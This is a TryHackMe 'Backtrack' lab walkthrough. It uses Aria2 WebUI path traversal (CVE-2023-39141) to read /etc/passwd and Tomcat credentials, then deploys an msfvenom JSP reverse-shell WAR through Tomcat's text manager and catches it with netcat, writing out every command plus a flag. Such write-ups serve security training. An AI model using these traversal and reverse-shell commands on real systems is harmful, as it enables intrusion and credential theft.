# <div align="center">[Backtrack TryHackMe Walkthrough]()</div>
<div align="center"></div>
<div align="center">
  
</div>

## Initial Reconnaissance
I started with a standard nmap scan to enumerate services and versions on the target.

```
nmap -sV -sC 10.48.132.202
```
The scan output I observed was:
```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 55:41:5a:65:e3:d8:c2:4f:59:a1:68:b6:79:8a:e3:fb (RSA)
|   256 79:8a:12:64:cc:5c:d2:b7:38:dd:4f:07:76:4f:92:e2 (ECDSA)
|_  256 ce:e2:28:01:5f:0f:6a:77:df:1e:0a:79:df:9a:54:47 (ED25519)
8080/tcp open  http            Apache Tomcat 8.5.93
|_http-title: Apache Tomcat/8.5.93
|_http-favicon: Apache Tomcat
8888/tcp open  sun-answerbook?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Sun, 09 Nov 2025 14:11:57 GMT
|     Connection: close
|     <!doctype html>
|     <html>
|     <!-- {{{ head -->
|     <head>
|     <link rel="icon" href="../favicon.ico" />
|     <meta charset="utf-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
|_    <svg aria-hidden="true" style="position: absolute; width: 0; height: 0; overflow: hidden;" version="1.1" xm
```
From the scan I noted three open ports and services:
* 22/tcp - OpenSSH 8.2p1 (standard SSH)
* 8080/tcp - Apache Tomcat 8.5.93 (default Tomcat web page)
* 8888/tcp - HTTP service responding with an Aria2 WebUI page (nmap's fingerprint shows Aria2 WebUI)

### Adding to Host file

Immediately after the scan I added a hosts entry so I could reference the machine by name (backtrack.thm) in later requests:

echo "10.48.132.202 backtrack.thm" | sudo tee -a /etc/hosts


(This appends the IP and hostname to /etc/hosts so I can use backtrack.thm in place of the IP address.)

## Vulnerability Reasearch
I focused on the web UI on port 8888. After inspecting the web interface I recognized it as Aria2 WebUI, which has a known path traversal vulnerability tracked as [CVE-2023–39141](https://security.snyk.io/vuln/SNYK-JS-WEBUIARIA2-6322148).
I tested a simple proof-of-concept path-traversal request using curl (exact command I ran):
```
curl --path-as-is http://backtrack.thm:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
```

<img width="1305" height="863" alt="image" src="https://github.com/user-attachments/assets/7e69a710-2492-411b-bd96-d686ffd52c22" />


The curl request returned the contents of /etc/passwd. This confirms the Aria2 WebUI instance is vulnerable to a directory traversal (path-traversal) allowing access to files outside the webroot.

## Exploitation 
As part of reconnaissance I identified three users on the system: tomcat, orville, and wilbur.

### Finding Tomcat credentials
Using the file‑traversal vulnerability discovered earlier, I read files outside the webroot to locate Tomcat's user configuration. Tomcat user accounts are typically stored in /opt/tomcat/conf/tomcat-users.xml, so I attempted to read that file with the exact command shown below.
```
curl --path-as-is http://backtrack.thm:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml
```
From the configuration file I retrieved the Tomcat user credentials
* username=`tomcat`
* password=`OPx52k53D8OkTZpx4fr`

<img width="1530" height="271" alt="image" src="https://github.com/user-attachments/assets/7a7584f4-b92a-4468-b5b1-a631647e48fc" />


I attempted to access the Tomcat Manager GUI with these credentials but received an HTTP 403 because the tomcat user lacked the manager-gui role. Even though the GUI was blocked, the credentials could still be useful for non‑GUI manager endpoints.

<img width="789" height="325" alt="image" src="https://github.com/user-attachments/assets/c3d10e36-c200-40b5-8669-dbde5d77a6cb" />

<img width="1420" height="465" alt="image" src="https://github.com/user-attachments/assets/8209b572-7693-4a4f-9aea-131d138f8ae0" />

### Generating a reverse shell WAR
I built a Java/JSP reverse shell packaged as a WAR using msfvenom. The exact command I used was:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=4444 -f war -o exploit.war
```
### Uploading the WAR (bypassing the 403)
To bypass the GUI restriction, I uploaded the WAR directly to Tomcat's text manager endpoint using basic authentication. This is the exact curl command I ran to deploy the WAR to the /foo context:
```
curl -v -u tomcat:OPx52k53D8OkTZpx4fr --upload-file exploit.war "http://backtrack.thm:8080/manager/text/deploy?path=/foo&update=true"
```
<img width="1508" height="581" alt="image" src="https://github.com/user-attachments/assets/e8a2b037-6a06-4949-b7b0-16c2f5fd43e4" />

### Triggering the shell and catching the callback
I started a local listener and then triggered the deployed web application to execute the JSP reverse shell.

Start the listener (exact command):
```
rlwrap nc -lnvp 4444
```
Trigger the deployed WAR by issuing a request to the deployed context:
```
curl http://backtrack.thm:8080/foo/
```
When the reverse connection arrived, I obtained an interactive shell on the target.
### Stabilising the shell
I upgraded the shell to a proper interactive TTY and set the terminal type using the following commands (exact):
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z to background the session locally
# Then run on your machine:
stty raw -echo; fg
```

<img width="551" height="299" alt="image" src="https://github.com/user-attachments/assets/8707d14d-1e16-4cd9-95f8-d2d70d530908" />

After upgrading the shell, I captured the first flag.
## Captured Flag1.txt
```
THM{823e4e40ead9683b06a8194eab01cee8}
```
<img width="395" height="99" alt="image" src="https://github.com/user-attachments/assets/58607ddf-bc24-4d01-a30a-992c4ca03faf" />

---

who am i
<img width="995" height="898" alt="image" src="https://github.com/user-attachments/assets/829c4048-b7d0-45f5-819b-2fbb24706f64" />

